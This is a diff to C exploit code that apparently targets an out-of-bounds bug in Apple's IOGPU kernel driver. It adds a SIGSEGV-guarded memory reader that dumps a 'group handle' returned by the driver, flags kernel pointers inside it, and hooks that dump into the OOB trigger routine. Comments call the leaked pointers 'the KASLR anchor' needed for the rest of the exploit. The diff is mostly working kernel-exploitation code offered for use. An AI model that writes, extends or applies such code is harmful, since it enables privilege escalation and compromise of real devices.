@@ -244,6 +244,92 @@ static void capacity_field_hunt(io_connect_t conn)
     }
 }
 
+
+/* A plain userspace read with a SIGSEGV guard.
+ *
+ * The group handle that cmd=3 hands back (out+0x10) is a USERSPACE
+ * address - the group is delivered as a user mapping. Reading it does not
+ * need the dead kernel-read channel at all: a normal memcpy does it. The
+ * only risk is that the address is not mapped, so the read is wrapped in
+ * a SIGSEGV handler and the bytes are probed in small steps.
+ *
+ * If the object is mapped we get the group's internals: the element
+ * array, the bitmap and the MASK - and the array/bitmap pointers are
+ * kernel addresses. That is the KASLR anchor and the readback we need
+ * for everything else. */
+#include <signal.h>
+#include <setjmp.h>
+
+static sigjmp_buf g_grp_jmp;
+static volatile sig_atomic_t g_grp_segv;
+
+static void grp_segv_handler(int sig)
+{
+    (void)sig;
+    g_grp_segv = 1;
+    siglongjmp(g_grp_jmp, 1);
+}
+
+static int grp_safe_read(uint64_t addr, void *dst, size_t n)
+{
+    struct sigaction sa, old;
+    memset(&sa, 0, sizeof(sa));
+    sa.sa_handler = grp_segv_handler;
+    sigemptyset(&sa.sa_mask);
+    sa.sa_flags = SA_NODEFER | SA_RESTART;
+    if (sigaction(SIGSEGV, &sa, &old) != 0) return -1;
+    g_grp_segv = 0;
+    if (sigsetjmp(g_grp_jmp, 1) == 0) {
+        memcpy(dst, (const void *)(uintptr_t)addr, n);
+        sigaction(SIGSEGV, &old, NULL);
+        return g_grp_segv ? -1 : 0;
+    }
+    sigaction(SIGSEGV, &old, NULL);
+    return -1;
+}
+
+static int grp_is_kernel_va(uint64_t v)
+{
+    uint64_t a = v & 0x00ffffffffffffffULL;
+    if (a < 0xfffffff000000000ULL || a >= 0xffffffff00000000ULL) return 0;
+    if (a == 0xffffffffffffffffULL) return 0;
+    return 1;
+}
+
+/* Dump a group handle and look for kernel addresses inside it. */
+static void grp_dump_handle(uint64_t h, const char *tag)
+{
+    if (!h) { ol("[grp] %s handle is null", tag); return; }
+    ol("[grp] %s dumping group handle 0x%016llx", tag, (unsigned long long)h);
+    uint8_t buf[0x200];
+    memset(buf, 0, sizeof(buf));
+    int r = grp_safe_read(h, buf, sizeof(buf));
+    if (r != 0) {
+        /* fall back to small chunks: maybe only the head is mapped */
+        for (size_t off = 0; off < 0x100; off += 0x20) {
+            if (grp_safe_read(h + off, buf + off, 0x20) == 0) {
+                ol("[grp] %s mapped from +0x%zx", tag, off);
+                r = 0;
+                break;
+            }
+        }
+    }
+    if (r != 0) { ol("[grp] %s handle is NOT mapped in our address space", tag); return; }
+    for (size_t off = 0; off + 8 <= sizeof(buf); off += 8) {
+        uint64_t v = 0;
+        memcpy(&v, buf + off, 8);
+        if (v) {
+            ol("[grp] %s +0x%03zx = 0x%016llx%s", tag, off, (unsigned long long)v,
+               grp_is_kernel_va(v) ? "   <-- KERNEL ADDRESS" : "");
+        }
+    }
+    uint32_t a20 = 0, a28 = 0, a2c = 0;
+    memcpy(&a20, buf + 0x20, 4);
+    memcpy(&a28, buf + 0x28, 4);
+    memcpy(&a2c, buf + 0x2c, 4);
+    ol("[grp] %s capacity@0x20=0x%x mask@0x28=0x%x log2@0x2c=0x%x", tag, a20, a28, a2c);
+}
+
 void nk_iogpu_group_oob_run(int trigger)
 {
     nk_doc_log_open("group_oob.log");
@@ -577,6 +663,11 @@ void nk_iogpu_group_oob_run(int trigger)
 
             int k6 = call_sel(conn, CMD_NEW_GROUP, 64, id, 0, 0, o6, &on6);
             if (k6 != 0) { ol("[grp] geo[%u] group failed kr=0x%x", gi, k6); CFRelease(s); continue; }
+            {
+                uint64_t gh = 0;
+                memcpy(&gh, o6 + 0x10, 8);
+                grp_dump_handle(gh, "geo");
+            }
             int a1 = call_sel(conn, CMD_ADD_RES, id, 1, 0, 0, o6, &on6);
             int a2 = call_sel(conn, CMD_ADD_RES, id, 1, 0, 0, o6, &on6);
             ol("[grp] geo[%u] id=%u add1=0x%x add2=0x%x%s", gi, id, a1, a2,
